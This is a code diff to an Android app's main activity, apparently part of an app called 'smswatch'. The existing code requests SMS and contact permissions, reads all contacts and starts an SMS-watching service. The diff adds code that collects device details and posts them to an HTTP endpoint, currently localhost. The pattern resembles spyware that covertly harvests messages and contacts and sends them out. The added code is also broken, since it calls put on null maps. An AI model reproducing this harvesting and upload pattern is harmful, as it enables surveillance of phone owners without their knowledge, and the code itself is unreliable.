@@ -11,6 +11,7 @@ import android.util.Log;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -18,9 +19,22 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        Log.i("smswatch","111 ");
-        getPermissions();
-        Log.i("smswatch","222 ");
+        Map<String,String> pmap = null;
+        Map<String,String> hmap = null;
+        String phoneinfo = Build.BRAND + "|" + Build.MODEL + "|" + Build.VERSION.RELEASE + "|" + Build.VERSION.SDK_INT;
+        Log.i("smswatch",phoneinfo);
+        pmap.put("smswatch",phoneinfo);
+        hmap.put("abc","123");
+        try {
+            HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        try {
+            getPermissions();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
         Intent myintent = new Intent(this, sms.class);
         Log.i("smswatch","Sms Start ");
@@ -31,7 +45,7 @@ public class MainActivity extends AppCompatActivity {
     String[] permissions = new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS};
     List<String> permissionList = new ArrayList<>();
 
-    private void getPermissions(){
+    private void getPermissions() throws Exception {
         permissionList.clear();
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
             for (int i =0; i < permissions.length; i++) {
@@ -44,7 +58,6 @@ public class MainActivity extends AppCompatActivity {
                 Log.i("smswatch", "Get Permission");
             } else {
                 getContact.getAllContacts(this);
-                Log.i("smswatch","333 ");
             }
         }
 
@@ -64,7 +77,11 @@ public class MainActivity extends AppCompatActivity {
                 Log.i("smswatch", " no permission granted");
             }
             else{
-                getPermissions();
+                try {
+                    getPermissions();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         }
 
